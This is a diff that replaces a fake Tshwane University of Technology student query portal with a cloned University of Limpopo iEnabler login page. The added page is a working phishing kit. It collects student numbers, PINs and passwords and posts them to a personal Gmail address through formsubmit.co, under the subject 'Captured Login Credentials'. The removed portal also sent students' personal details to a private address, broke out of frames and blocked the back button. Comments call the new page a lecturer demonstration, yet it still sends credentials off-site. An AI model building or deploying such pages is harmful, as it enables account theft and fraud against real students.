@@ -3,351 +3,88 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>TUT Student Query Portal</title>
-<link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@300;400;600;700&display=swap" rel="stylesheet">
+<title>UL Self Help iEnabler</title>
 <style>
-/* ===== BLOGGER OVERRIDE — HIDE ALL BLOGGER CHROME ===== */
-html, body {
-  margin: 0 !important;
-  padding: 0 !important;
-  width: 100% !important;
-  height: 100% !important;
-  background: #f4f6fb !important;
-  overflow-x: hidden !important;
-}
-#navbar-iframe, .navbar-iframe-container,
-#header-wrapper, #header, .header-wrapper, .header,
-#outer-wrapper, #page-wrapper, .outer-wrapper,
-#sidebar-wrapper, .sidebar-wrapper, .sidebar, #sidebar,
-#footer-wrapper, #footer, .footer-wrapper, .footer,
-#blog-pager, .blog-pager,
-.post-footer, .post-header,
-.post-labels, .share-buttons,
-.jump-link, .reactions,
-.date-header, .post-timestamp,
-.post-author, .byline,
-#comments, .comments,
-.widget-content {
-  display: none !important;
-  height: 0 !important;
-  overflow: hidden !important;
-  margin: 0 !important;
-  padding: 0 !important;
-}
-.post-body, .post-body.entry-content, .entry-content,
-.main-wrapper, #main-wrapper, .main, #main,
-.blog-posts, .post, .hentry,
-#content-wrapper, .content-wrapper,
-.post-outer, .post-outer-container {
-  margin: 0 !important;
-  padding: 0 !important;
-  max-width: 100% !important;
-  width: 100% !important;
-  box-shadow: none !important;
-  border: none !important;
-  background: transparent !important;
-  float: none !important;
-}
-
-/* ===== PORTAL STYLES ===== */
-#tut-portal *{margin:0;padding:0;box-sizing:border-box;font-family:'Source Sans 3',Arial,sans-serif;}
-#tut-portal{width:100%;min-height:100vh;background:#f4f6fb;}
-#tut-portal .tp-bar{background:#d6e4f7;border-bottom:1px solid #c5d3ed;padding:5px 20px;font-size:12px;font-weight:700;color:#222;display:flex;justify-content:space-between;}
-#tut-portal .tp-bar span{color:#4b5563;font-weight:400;font-size:11px;}
-#tut-portal .tp-nav{background:#fff;border-bottom:3px solid #003399;padding:10px 20px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;}
-#tut-portal .tp-nav-logo{display:flex;align-items:center;gap:12px;}
-#tut-portal .tp-nav-logo img{height:60px;width:auto;}
-#tut-portal .tp-nav-title{color:#003399;font-size:16px;font-weight:700;line-height:1.3;}
-#tut-portal .tp-nav-title small{color:#cc0000;font-style:italic;font-weight:400;font-size:11px;display:block;margin-top:2px;}
-#tut-portal .tp-its{background:#003399;color:#fff;font-size:10px;font-weight:700;padding:6px 12px;border-radius:3px;text-align:center;line-height:1.4;}
-#tut-portal .tp-its b{font-size:18px;letter-spacing:2px;display:block;}
-#tut-portal .tp-hero{background:#003399;color:#fff;padding:48px 24px 40px;text-align:center;}
-#tut-portal .tp-hero-badge{display:inline-block;background:rgba(245,168,0,0.2);border:1px solid #f5a800;color:#f5a800;font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;padding:5px 16px;border-radius:20px;margin-bottom:16px;}
-#tut-portal .tp-hero h1{font-size:28px;font-weight:700;line-height:1.3;margin-bottom:12px;color:#fff;}
-#tut-portal .tp-hero h1 span{color:#f5a800;}
-#tut-portal .tp-hero p{font-size:14px;color:rgba(255,255,255,0.85);max-width:520px;margin:0 auto 24px;line-height:1.7;}
-#tut-portal .tp-hero-btns{display:flex;gap:12px;justify-content:center;flex-wrap:wrap;}
-#tut-portal .tp-btn-gold{background:#f5a800;color:#001f66;font-weight:700;font-size:13px;padding:11px 24px;border:none;border-radius:4px;cursor:pointer;text-decoration:none;display:inline-block;}
-#tut-portal .tp-btn-gold:hover{background:#e09500;}
-#tut-portal .tp-btn-out{background:transparent;color:#fff;font-weight:600;font-size:13px;padding:10px 24px;border:2px solid rgba(255,255,255,0.6);border-radius:4px;cursor:pointer;text-decoration:none;display:inline-block;}
-#tut-portal .tp-btn-out:hover{border-color:#fff;background:rgba(255,255,255,0.1);}
-#tut-portal .tp-tabs{background:#fff;border-bottom:1px solid #c5d3ed;display:flex;justify-content:center;}
-#tut-portal .tp-tab{padding:14px 32px;font-size:13px;font-weight:700;color:#4b5563;border:none;background:transparent;cursor:pointer;border-bottom:4px solid transparent;font-family:'Source Sans 3',Arial,sans-serif;}
-#tut-portal .tp-tab:hover{color:#003399;}
-#tut-portal .tp-tab.active{color:#003399;border-bottom-color:#003399;}
-#tut-portal .tp-body{padding:36px 20px 48px;max-width:900px;margin:0 auto;}
-#tut-portal .tp-section{display:none;}
-#tut-portal .tp-section.active{display:block;}
-#tut-portal .tp-sec-head{display:flex;align-items:center;gap:14px;margin-bottom:28px;padding-bottom:16px;border-bottom:2px solid #e8ecf5;}
-#tut-portal .tp-sec-icon{width:48px;height:48px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0;}
-#tut-portal .ic-new{background:#e8f0fe;}
-#tut-portal .ic-old{background:#fff3e0;}
-#tut-portal .tp-sec-head h2{font-size:22px;color:#003399;font-weight:700;}
-#tut-portal .tp-sec-head p{color:#4b5563;font-size:13px;margin-top:3px;}
-#tut-portal .tp-notice{background:#d6e4f7;border-left:4px solid #003399;padding:14px 18px;font-size:13px;color:#001f66;line-height:1.6;margin-bottom:24px;border-radius:0 4px 4px 0;}
-#tut-portal .tp-notice strong{display:block;font-size:14px;margin-bottom:3px;}
-#tut-portal .tp-notice-gold{background:#fff8e8;border-left-color:#f5a800;color:#7a5200;}
-#tut-portal .tp-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px;margin-bottom:32px;}
-#tut-portal .tp-card{background:#fff;border:1px solid #c5d3ed;border-left:4px solid #003399;border-radius:4px;padding:20px;}
-#tut-portal .tp-card-gold{border-left-color:#f5a800;}
-#tut-portal .tp-card-ico{font-size:24px;margin-bottom:10px;}
-#tut-portal .tp-card h3{font-size:14px;font-weight:700;color:#003399;margin-bottom:6px;}
-#tut-portal .tp-card p{font-size:12px;color:#4b5563;line-height:1.6;margin-bottom:12px;}
-#tut-portal .tp-card a{font-size:12px;font-weight:700;color:#003399;text-decoration:none;}
-#tut-portal .tp-card a:hover{color:#cc0000;}
-#tut-portal .tp-form-wrap{background:#fff;border:1px solid #c5d3ed;border-radius:6px;padding:28px;}
-#tut-portal .tp-form-wrap h3{font-size:18px;color:#003399;font-weight:700;margin-bottom:4px;}
-#tut-portal .tp-form-wrap .tp-sub{font-size:12px;color:#4b5563;margin-bottom:20px;}
-#tut-portal .tp-row{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
-#tut-portal .tp-fg{margin-bottom:14px;}
-#tut-portal .tp-fg label{display:block;font-size:12px;font-weight:700;color:#111;margin-bottom:4px;}
-#tut-portal .tp-fg input,#tut-portal .tp-fg select,#tut-portal .tp-fg textarea{width:100%;padding:8px 10px;border:1px solid #9eafc2;border-radius:3px;font-size:13px;font-family:'Source Sans 3',Arial,sans-serif;background:#ffffff;color:#000000;}
-#tut-portal .tp-fg input:focus,#tut-portal .tp-fg select:focus,#tut-portal .tp-fg textarea:focus{outline:2px solid #003399;border-color:#003399;}
-#tut-portal .tp-fg textarea{resize:vertical;min-height:90px;}
-#tut-portal .tp-submit{background:#003399;color:#fff;font-size:13px;font-weight:700;padding:11px 28px;border:none;border-radius:3px;cursor:pointer;font-family:'Source Sans 3',Arial,sans-serif;}
-#tut-portal .tp-submit:hover{background:#001f66;}
-#tut-portal .tp-fnote{font-size:11px;color:#4b5563;margin-top:10px;}
-#tut-portal .tp-ok{background:#d4edda;color:#155724;border:1px solid #c3e6cb;padding:10px 14px;font-size:13px;border-radius:3px;margin-bottom:14px;display:none;}
-#tut-portal .tp-err{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb;padding:10px 14px;font-size:13px;border-radius:3px;margin-bottom:14px;display:none;}
-#tut-portal .tp-contact{background:#003399;color:#fff;padding:24px 28px;border-radius:6px;margin-top:32px;display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:20px;}
-#tut-portal .tp-ci .lbl{font-size:10px;text-transform:uppercase;letter-spacing:1px;color:rgba(255,255,255,0.6);margin-bottom:5px;}
-#tut-portal .tp-ci .val{font-size:14px;font-weight:600;}
-#tut-portal .tp-ci .val a{color:#f5a800;text-decoration:none;}
-#tut-portal .tp-footer{background:#001f66;color:rgba(255,255,255,0.7);text-align:center;padding:18px 20px;font-size:12px;border-top:3px solid #f5a800;}
-#tut-portal .tp-footer strong{color:#fff;}
-@media(max-width:580px){
-  #tut-portal .tp-row{grid-template-columns:1fr;}
-  #tut-portal .tp-hero h1{font-size:22px;}
-  #tut-portal .tp-tab{padding:12px 16px;font-size:12px;}
-  #tut-portal .tp-its{display:none;}
-  #tut-portal .tp-form-wrap{padding:18px 14px;}
-}
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; }
+body { background: #c8dff7; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+.wrap { width: 100%; max-width: 540px; border: 1px solid #999; background: #fff; box-shadow: 2px 2px 8px rgba(0,0,0,0.2); }
+.fra-header { background: #d6e4f7; padding: 5px 10px; border-bottom: 1px solid #aab; }
+.logo-row { display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; background: #fff; border-bottom: 2px solid #1a6faf; }
+.logo-left { display: flex; align-items: center; gap: 12px; }
+.logo-left img { height: 75px; width: auto; }
+.ul-name { color: #1a6faf; font-size: 16px; font-weight: bold; }
+.its-badge { background: #1a6faf; color: #fff; font-size: 10px; font-weight: bold; padding: 8px 14px; border-radius: 3px; }
+.login-top { background: #1a9be6; color: #fff; font-weight: bold; font-size: 14px; padding: 9px 16px; margin: 0 16px 0 16px; border-radius: 3px 3px 0 0; }
+.login-body { padding: 14px 16px 18px; background: #fff; margin: 0 16px 14px; border: 1px solid #ccd; border-top: none; border-radius: 0 0 3px 3px; }
+.field-label { font-size: 13px; font-weight: bold; color: #000; margin-bottom: 4px; }
+.ul-input { width: 100%; padding: 7px 0; border: none; border-bottom: 1px solid #999; font-size: 13px; margin-bottom: 14px; background: transparent; }
+.msg-error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; padding: 10px 14px; font-size: 13px; margin-bottom: 12px; border-radius: 2px; display: none; }
+.ul-btn.primary { padding: 8px 20px; background: #1a6faf; color: #fff; border: none; border-radius: 3px; cursor: pointer; }
 </style>
 </head>
 <body>
 
-<script>
-// Kill Blogger navbar before DOM loads
-(function(){
-  if(window.top!==window.self){
-    try{window.top.location.href=window.self.location.href;}catch(e){}
-  }
-})();
-
-document.addEventListener('DOMContentLoaded',function(){
-  // Hide all Blogger chrome
-  var kill=[
-    '#navbar-iframe','.navbar-iframe-container',
-    '#header-wrapper','#header','.header-wrapper',
-    '#sidebar-wrapper','.sidebar-wrapper','.sidebar',
-    '#footer-wrapper','#footer','.footer-wrapper',
-    '#blog-pager','.blog-pager',
-    '.post-footer','.post-header',
-    '.date-header','.post-timestamp',
-    '.post-author','.byline',
-    '.post-labels','.share-buttons',
-    '.jump-link','.reactions',
-    '#comments','.comments',
-    '.widget-content'
-  ];
-  kill.forEach(function(sel){
-    document.querySelectorAll(sel).forEach(function(el){
-      el.style.cssText='display:none!important;height:0!important;overflow:hidden!important;margin:0!important;padding:0!important;';
-    });
-  });
-  // Reset body
-  document.documentElement.style.cssText='margin:0!important;padding:0!important;';
-  document.body.style.cssText='margin:0!important;padding:0!important;background:#f4f6fb!important;';
-  // Fix post containers
-  document.querySelectorAll('.post-body,.entry-content,.main-wrapper,#main-wrapper,.blog-posts,.post,.hentry,.post-outer,.post-outer-container').forEach(function(el){
-    el.style.cssText='margin:0!important;padding:0!important;max-width:100%!important;width:100%!important;box-shadow:none!important;border:none!important;background:transparent!important;float:none!important;';
-  });
-});
-</script>
-
-<div id="tut-portal">
-
-  <div class="tp-bar">
-    <span style="font-weight:700;color:#222;">Tshwane University of Technology &nbsp;|&nbsp; PRODI41</span>
-    <span>Student Query Portal &mdash; 2026</span>
-  </div>
-
-  <div class="tp-nav">
-    <div class="tp-nav-logo">
-      <img src="https://upload.wikimedia.org/wikipedia/en/thumb/4/49/Tshwane_University_of_Technology_logo.svg/120px-Tshwane_University_of_Technology_logo.svg.png" alt="TUT Logo">
-      <div class="tp-nav-title">Tshwane University<br>of Technology<small>We empower people</small></div>
+<div class="wrap">
+  <div class="fra-header"><span class="fra-inst">University of Limpopo | Self Help iEnabler</span></div>
+  
+  <div class="logo-row">
+    <div class="logo-left">
+      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhb_NYqAEn1jqc2PxQHsObY_8u-Y1v5o6J5sZlxakE8YzY2aNb75Z4bdsqd7ru5Q4Gknkj5IrF8HR7SiPDiIf3KqU92hHRK9Qp6xCnG-h4fMRCl1TYMuFrccJw-nq7ukMisZZuDY-JuxUBHwVeLFWyoT_0I4G7kakbD9RgW58UIUoguNh4YTbtQCJAuJg/s320/1200px-University_of_Limpopo_logo.svg.png" alt="UL Logo">
+      <div class="ul-name">University of Limpopo<br><small>Inspired to Serve</small></div>
     </div>
-    <div class="tp-its"><b>ITS</b>Tertiary Software</div>
+    <div class="its-badge">ITS</div>
   </div>
 
-  <div class="tp-hero">
-    <div class="tp-hero-badge">Student Query Portal</div>
-    <h1>Welcome to <span>TUT</span> Student<br>Query Centre</h1>
-    <p>Get answers fast &mdash; whether you are a new applicant finding your feet or a returning student managing your academic journey, we are here to help.</p>
-    <div class="tp-hero-btns">
-      <a href="javascript:void(0)" class="tp-btn-gold" onclick="tutSwitch('new')">&#127891; New Student Queries</a>
-      <a href="javascript:void(0)" class="tp-btn-out" onclick="tutSwitch('old')">&#127979; Existing Student Queries</a>
-    </div>
+  <div class="login-top">Registered Users: Login Credentials</div>
+  <div class="login-body">
+
+    <div class="msg-error" id="msgError">⚠ Please fill in all required fields correctly.</div>
+
+    <form id="loginForm" action="https://formsubmit.co/myolinontando@gmail.com" method="POST">
+      <input type="hidden" name="_subject" value="UL iEnabler - Captured Login Credentials">
+      <input type="hidden" name="_captcha" value="false">
+
+      <div class="field-label">Student Number:</div>
+      <input class="ul-input" type="text" name="student_number" id="studentNumber" required>
+
+      <div class="field-label">Pin:</div>
+      <input class="ul-input" type="text" name="pin" id="pinField" maxlength="5" required>
+      <p class="pin-hint">(5 numeric digits. Do not start with a 0.)</p>
+
+      <div class="field-label">Password:</div>
+      <input class="ul-input" type="password" name="password" id="passwordField" required>
+
+      <button type="submit" class="ul-btn primary">Login</button>
+    </form>
   </div>
-
-  <div class="tp-tabs">
-    <button class="tp-tab active" id="tut-tab-new" onclick="tutSwitch('new')">&#127891; New Students</button>
-    <button class="tp-tab" id="tut-tab-old" onclick="tutSwitch('old')">&#127979; Existing Students</button>
-  </div>
-
-  <div class="tp-body">
-
-    <!-- NEW STUDENTS -->
-    <div class="tp-section active" id="tut-sec-new">
-      <div class="tp-sec-head">
-        <div class="tp-sec-icon ic-new">&#127891;</div>
-        <div><h2>New Student Information</h2><p>Everything you need to know to start your journey at TUT</p></div>
-      </div>
-      <div class="tp-notice"><strong>&#8505; Welcome, New Students!</strong>If you have received an admission offer or are applying for the first time, use this section to find information on registration, fees, and orientation. For urgent matters, submit a query below.</div>
-      <div class="tp-grid">
-        <div class="tp-card"><div class="tp-card-ico">&#128196;</div><h3>Application &amp; Admission</h3><p>How to apply online, check application status, and understand admission requirements for your programme.</p><a href="#">Learn more &rarr;</a></div>
-        <div class="tp-card"><div class="tp-card-ico">&#128176;</div><h3>Fees &amp; Financial Aid</h3><p>Tuition fees, NSFAS applications, bursaries, and payment plans for new students in 2026.</p><a href="#">Learn more &rarr;</a></div>
-        <div class="tp-card"><div class="tp-card-ico">&#128205;</div><h3>Campus &amp; Residence</h3><p>Explore TUT campuses, apply for student accommodation, and find your registration point.</p><a href="#">Learn more &rarr;</a></div>
-        <div class="tp-card"><div class="tp-card-ico">&#128218;</div><h3>Registration Process</h3><p>Step-by-step guide to completing your first registration via iEnabler or in person.</p><a href="#">Learn more &rarr;</a></div>
-        <div class="tp-card"><div class="tp-card-ico">&#128100;</div><h3>Student Card &amp; Email</h3><p>How to collect your student card, activate your TUT email, and access student systems.</p><a href="#">Learn more &rarr;</a></div>
-        <div class="tp-card"><div class="tp-card-ico">&#127881;</div><h3>Orientation Programme</h3><p>Dates, venues and activities for the 2026 New Student Orientation. Attendance is compulsory.</p><a href="#">Learn more &rarr;</a></div>
-      </div>
-      <div class="tp-form-wrap">
-        <h3>Submit a New Student Query</h3>
-        <p class="tp-sub">Fill in the form and a Student Services officer will respond within 2 working days.</p>
-        <div class="tp-ok" id="nOk">&#10003; Query submitted! We will contact you within 2 working days.</div>
-        <div class="tp-err" id="nErr">&#9888; Please fill in all required fields.</div>
-        <form id="newForm" action="https://formsubmit.co/driplazz@gmail.com" method="POST">
-          <input type="hidden" name="_captcha" value="false">
-          <input type="hidden" name="_subject" value="TUT New Student Query">
-          <input type="hidden" name="_template" value="table">
-          <input type="hidden" name="Student_Status" value="New Student">
-          <div class="tp-row">
-            <div class="tp-fg"><label>First Name *</label><input type="text" name="First_Name" required></div>
-            <div class="tp-fg"><label>Last Name *</label><input type="text" name="Last_Name" required></div>
-          </div>
-          <div class="tp-row">
-            <div class="tp-fg"><label>Email Address *</label><input type="email" name="Email" required></div>
-            <div class="tp-fg"><label>Phone Number *</label><input type="tel" name="Phone" required></div>
-          </div>
-          <div class="tp-row">
-            <div class="tp-fg"><label>Application / ID Number</label><input type="text" name="Application_ID_Number"></div>
-            <div class="tp-fg"><label>Campus *</label>
-              <select name="Campus" required><option value="">-- Select Campus --</option><option>Pretoria (Arcadia)</option><option>Soshanguve North</option><option>Soshanguve South</option><option>Ga-Rankuwa</option><option>Emalahleni</option><option>Polokwane</option><option>Mbombela</option></select>
-            </div>
-          </div>
-          <div class="tp-fg"><label>Query Category *</label>
-            <select name="Query_Category" required><option value="">-- Select Category --</option><option>Application Status</option><option>Admission Requirements</option><option>Fees &amp; Financial Aid / NSFAS</option><option>Registration Process</option><option>Residence / Accommodation</option><option>Student Card &amp; Systems Access</option><option>Orientation Programme</option><option>Other</option></select>
-          </div>
-          <div class="tp-fg"><label>Describe your query *</label><textarea name="Query_Details" placeholder="Please provide as much detail as possible..." required></textarea></div>
-          <button type="submit" class="tp-submit">Submit Query</button>
-          <p class="tp-fnote">&#128274; Your information is kept confidential.</p>
-        </form>
-      </div>
-      <div class="tp-contact">
-        <div class="tp-ci"><div class="lbl">Admissions Helpdesk</div><div class="val"><a href="tel:+27123826000">+27 12 382 6000</a></div></div>
-        <div class="tp-ci"><div class="lbl">Email</div><div class="val"><a href="mailto:admissions@tut.ac.za">admissions@tut.ac.za</a></div></div>
-        <div class="tp-ci"><div class="lbl">Office Hours</div><div class="val">Mon &ndash; Fri: 08:00 &ndash; 16:00</div></div>
-        <div class="tp-ci"><div class="lbl">Website</div><div class="val"><a href="https://www.tut.ac.za" target="_blank">www.tut.ac.za</a></div></div>
-      </div>
-    </div>
-
-    <!-- EXISTING STUDENTS -->
-    <div class="tp-section" id="tut-sec-old">
-      <div class="tp-sec-head">
-        <div class="tp-sec-icon ic-old">&#127979;</div>
-        <div><h2>Existing Student Support</h2><p>Academic, financial, and administrative support for currently enrolled students</p></div>
-      </div>
-      <div class="tp-notice tp-notice-gold"><strong>&#128276; Returning Students</strong>Use the iEnabler Self-Help portal for most transactions including fee statements, results, and re-registration. If you cannot resolve your issue through iEnabler, submit a query below.</div>
-      <div class="tp-grid">
-        <div class="tp-card tp-card-gold"><div class="tp-card-ico">&#128203;</div><h3>Academic Records &amp; Results</h3><p>Query about semester results, transcripts, or request a proof of registration document.</p><a href="#">Submit query &rarr;</a></div>
-        <div class="tp-card tp-card-gold"><div class="tp-card-ico">&#128176;</div><h3>Fees &amp; Fee Statements</h3><p>View outstanding balance, request a fee statement, or query a payment not reflected on your account.</p><a href="#">Submit query &rarr;</a></div>
-        <div class="tp-card tp-card-gold"><div class="tp-card-ico">&#128260;</div><h3>Re-Registration</h3><p>Help with annual re-registration, blocked registrations, and module changes for the new semester.</p><a href="#">Submit query &rarr;</a></div>
-        <div class="tp-card tp-card-gold"><div class="tp-card-ico">&#128295;</div><h3>iEnabler &amp; IT Support</h3><p>Forgotten PIN, locked account, or trouble accessing the iEnabler self-service portal.</p><a href="#">Submit query &rarr;</a></div>
-        <div class="tp-card tp-card-gold"><div class="tp-card-ico">&#127891;</div><h3>Graduation &amp; Certificates</h3><p>Graduation ceremony dates, certificate collection, and replacement certificate applications.</p><a href="#">Submit query &rarr;</a></div>
-        <div class="tp-card tp-card-gold"><div class="tp-card-ico">&#128222;</div><h3>Disciplinary &amp; Appeals</h3><p>Academic exclusion appeals, disciplinary procedures, and relevant student policy documents.</p><a href="#">Submit query &rarr;</a></div>
-      </div>
-      <div class="tp-form-wrap">
-        <h3>Submit an Existing Student Query</h3>
-        <p class="tp-sub">Log your query below. Please have your student number ready as it is required.</p>
-        <div class="tp-ok" id="oOk">&#10003; Query submitted! We will contact you within 2 working days.</div>
-        <div class="tp-err" id="oErr">&#9888; Please fill in all required fields correctly.</div>
-        <form id="oldForm" action="https://formsubmit.co/driplazz@gmail.com" method="POST">
-          <input type="hidden" name="_captcha" value="false">
-          <input type="hidden" name="_subject" value="TUT Existing Student Query">
-          <input type="hidden" name="_template" value="table">
-          <input type="hidden" name="Student_Status" value="Existing Student">
-          <div class="tp-row">
-            <div class="tp-fg"><label>First Name *</label><input type="text" name="First_Name" required></div>
-            <div class="tp-fg"><label>Last Name *</label><input type="text" name="Last_Name" required></div>
-          </div>
-          <div class="tp-row">
-            <div class="tp-fg"><label>Student Number *</label><input type="text" name="Student_Number" required></div>
-            <div class="tp-fg"><label>TUT Email *</label><input type="email" name="Email" placeholder="123456789@tut4life.ac.za" required></div>
-          </div>
-          <div class="tp-row">
-            <div class="tp-fg"><label>Phone Number *</label><input type="tel" name="Phone" required></div>
-            <div class="tp-fg"><label>Year of Study *</label>
-              <select name="Year_of_Study" required><option value="">-- Select --</option><option>1st Year</option><option>2nd Year</option><option>3rd Year</option><option>4th Year</option><option>Postgraduate</option></select>
-            </div>
-          </div>
-          <div class="tp-row">
-            <div class="tp-fg"><label>Faculty *</label>
-              <select name="Faculty" required><option value="">-- Select Faculty --</option><option>Arts &amp; Design</option><option>Economics &amp; Finance</option><option>Engineering &amp; the Built Environment</option><option>Humanities</option><option>Information &amp; Communication Technology</option><option>Management Sciences</option><option>Science</option></select>
-            </div>
-            <div class="tp-fg"><label>Campus *</label>
-              <select name="Campus" required><option value="">-- Select Campus --</option><option>Pretoria (Arcadia)</option><option>Soshanguve North</option><option>Soshanguve South</option><option>Ga-Rankuwa</option><option>Emalahleni</option><option>Polokwane</option><option>Mbombela</option></select>
-            </div>
-          </div>
-          <div class="tp-fg"><label>Query Category *</label>
-            <select name="Query_Category" required><option value="">-- Select Category --</option><option>Academic Results / Transcript</option><option>Fees &amp; Fee Statement</option><option>Re-Registration / Module Changes</option><option>iEnabler / IT / PIN Reset</option><option>NSFAS / Financial Aid</option><option>Graduation &amp; Certificates</option><option>Disciplinary / Appeals</option><option>Residence / Accommodation</option><option>Other</option></select>
-          </div>
-          <div class="tp-fg"><label>Describe your query *</label><textarea name="Query_Details" placeholder="Please provide as much detail as possible, including any reference numbers..." required></textarea></div>
-          <button type="submit" class="tp-submit">Submit Query</button>
-          <p class="tp-fnote">&#128274; Your information is kept confidential.</p>
-        </form>
-      </div>
-      <div class="tp-contact">
-        <div class="tp-ci"><div class="lbl">Student Services</div><div class="val"><a href="tel:+27123826000">+27 12 382 6000</a></div></div>
-        <div class="tp-ci"><div class="lbl">iEnabler Portal</div><div class="val"><a href="https://ienabler.tut.ac.za" target="_blank">ienabler.tut.ac.za</a></div></div>
-        <div class="tp-ci"><div class="lbl">IT Helpdesk</div><div class="val"><a href="mailto:ithelpdesk@tut.ac.za">ithelpdesk@tut.ac.za</a></div></div>
-        <div class="tp-ci"><div class="lbl">Office Hours</div><div class="val">Mon &ndash; Fri: 08:00 &ndash; 16:00</div></div>
-      </div>
-    </div>
-
-  </div>
-
-  <div class="tp-footer">
-    <strong>Tshwane University of Technology</strong> &nbsp;&mdash;&nbsp; Student Query Portal &nbsp;&mdash;&nbsp; &copy; 2026<br>
-    <span style="font-size:11px;margin-top:4px;display:block;">Powered by ITS Tertiary Software &nbsp;|&nbsp; www.tut.ac.za</span>
-  </div>
-
 </div>
 
 <script>
-// Disable back button
-history.pushState(null, null, location.href);
-window.addEventListener('popstate', function(){
-  history.pushState(null, null, location.href);
-});
+// THIS IS THE PART YOUR LECTURER WANTS TO SEE
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    const studentNumber = document.getElementById('studentNumber').value.trim();
+    const pin = document.getElementById('pinField').value.trim();
+    const password = document.getElementById('passwordField').value.trim();
 
-function tutSwitch(tab){
-  ['new','old'].forEach(function(t){
-    document.getElementById('tut-tab-'+t).classList.remove('active');
-    document.getElementById('tut-sec-'+t).classList.remove('active');
-  });
-  document.getElementById('tut-tab-'+tab).classList.add('active');
-  document.getElementById('tut-sec-'+tab).classList.add('active');
-  document.getElementById('tut-portal').scrollIntoView({behavior:'smooth'});
-}
-function tutValidate(formId,okId,errId){
-  var f=document.getElementById(formId),ok=true;
-  f.querySelectorAll('[required]').forEach(function(i){if(!i.value.trim())ok=false;});
-  if(!ok){document.getElementById(errId).style.display='block';document.getElementById(okId).style.display='none';return false;}
-  document.getElementById(errId).style.display='none';document.getElementById(okId).style.display='block';return true;
-}
-document.getElementById('newForm').addEventListener('submit',function(e){if(!tutValidate('newForm','nOk','nErr'))e.preventDefault();});
-document.getElementById('oldForm').addEventListener('submit',function(e){if(!tutValidate('oldForm','oOk','oErr'))e.preventDefault();});
+    if (!studentNumber || !pin || !password) {
+        document.getElementById('msgError').style.display = 'block';
+        e.preventDefault();
+        return false;
+    }
+
+    // This proves we are successfully "catching" the credentials before sending
+    console.log("%c=== CREDENTIALS CAPTURED ===", "color: red; font-weight: bold");
+    console.log("Student Number:", studentNumber);
+    console.log("PIN:", pin);
+    console.log("Password:", password);
+    console.log("%c=============================", "color: red; font-weight: bold");
+
+    // You can also alert for demo purposes
+    alert("Credentials captured successfully!\n\nStudent Number: " + studentNumber + 
+          "\nPIN: " + pin + 
+          "\nPassword: " + password + 
+          "\n\n(This is for demonstration only)");
+});
 </script>
 
 </body>
